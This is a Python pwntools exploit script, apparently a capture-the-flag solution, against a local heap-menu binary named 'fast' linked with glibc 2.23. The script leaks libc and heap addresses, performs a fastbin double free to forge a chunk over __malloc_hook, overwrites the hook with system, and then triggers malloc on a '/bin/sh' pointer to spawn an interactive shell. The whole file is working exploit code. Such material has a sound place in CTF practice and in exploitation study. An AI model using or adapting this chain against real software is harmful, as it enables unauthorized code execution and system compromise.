#!/usr/bin/env python3
from pwn import *

def create(size):
    p.sendlineafter(b'# ', '1')
    p.sendlineafter(b'size:', str(size))

def get(idx):
    p.sendlineafter(b'# ', '2')
    p.sendlineafter(b'idx:', str(idx))
    p.recvuntil(b']: ')
    return p.recvline()[:-1]

def set(idx, payload):
    p.sendlineafter(b'# ', '3')
    p.sendlineafter(b'idx:', str(idx))
    p.sendafter(b'str:', payload)

def delete(idx):
    p.sendlineafter(b'# ', '4')
    p.sendlineafter(b'idx:', str(idx))

def bye():
    p.sendlineafter(b'# ', '5')

p = process('./fast')
libc = ELF('./libc-2.23.so')
gdb.attach(p)
create(0x430)
create(0x60)
create(0x60)
create(0x60)

# Leak libc
delete(0)
create(0x430)
bins = u64(get(4).ljust(8, b'\0'))

libc.address = bins - 0x3c4b78

log.info(hex(libc.address))

__malloc_hook_s23h = libc.address + 0x3c4aed # __malloc_hook - 0x23

# one_gadget = libc.address + 0xf0364
# log.info(hex(one_gadget))

# Use Fastbin Dup
delete(1)
delete(2)
delete(1)

## Leak heap
delete(3)
create(0x60)
heap = u64(get(5).ljust(8, b'\0'))
log.info(hex(heap))

create(0x60)
set(6, p64(__malloc_hook_s23h))

create(0x60)
create(0x60)
create(0x60)

set(8, b'/bin/sh')

# Overwrite *__malloc_hook to system
payload = b'A' * 0x13 + p64(libc.symbols['system'])
set(9, payload)

# malloc("/bin/sh") -> (*__malloc_hook)("/bin/sh") -> system("/bin/sh")
create(heap+0x10)

p.interactive()
